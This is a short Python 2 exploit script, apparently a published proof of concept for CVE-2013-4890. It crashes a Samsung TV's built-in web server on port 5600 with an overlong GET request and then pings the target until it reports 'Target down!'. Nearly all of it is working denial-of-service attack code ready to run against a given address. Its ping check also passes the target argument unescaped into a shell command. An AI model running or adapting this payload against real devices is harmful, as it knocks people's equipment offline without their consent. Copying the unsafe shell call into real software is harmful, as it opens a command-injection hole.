#! /usr/bin/env python
#coding=utf-8

# Exploit Title: Samsung TV Denial of Service (DoS) Attack
# Exploit Author: Malik Mesellem - @MME_IT - http://www.itsecgames.com
# Date: 07/21/2013
# CVE Number: CVE-2013-4890
# Vendor Homepage: http://www.samsung.com
# Description:
#   The web server (DMCRUIS/0.1) on port TCP/5600 is crashing by sending a long HTTP GET request
#   As a results, the TV reboots...
#   Tested successfully on my Samsung PS50C7700 plasma TV, with the latest firmware :)

import httplib
import sys
import os

print "  ***************************************************************************************"
print "   Author: Malik Mesellem - @MME_IT - http://www.itsecgames.com\n"
print "   Exploit: Denial of Service (DoS) attack\n"
print "   Description:\n"
print "     The web server (DMCRUIS/0.1) on port TCP/5600 is crashing by sending a long request."
print "     Tested successfully on my Samsung PS50C7700 plasma TV :)\n"
print "  ***************************************************************************************\n"

# Sends the payload
print "  Sending the malicious payload...\n"
conn = httplib.HTTPConnection(sys.argv[1],5600)
conn.request("GET", "A"*300)
conn.close()

# Checks the response
print "  Checking the status... (CTRL+Z to stop)\n"
response = 0
while response == 0:
  response = os.system("ping -c 1 " + sys.argv[1] + "> /dev/null 2>&1")
  if response != 0:
    print "  Target down!\n"
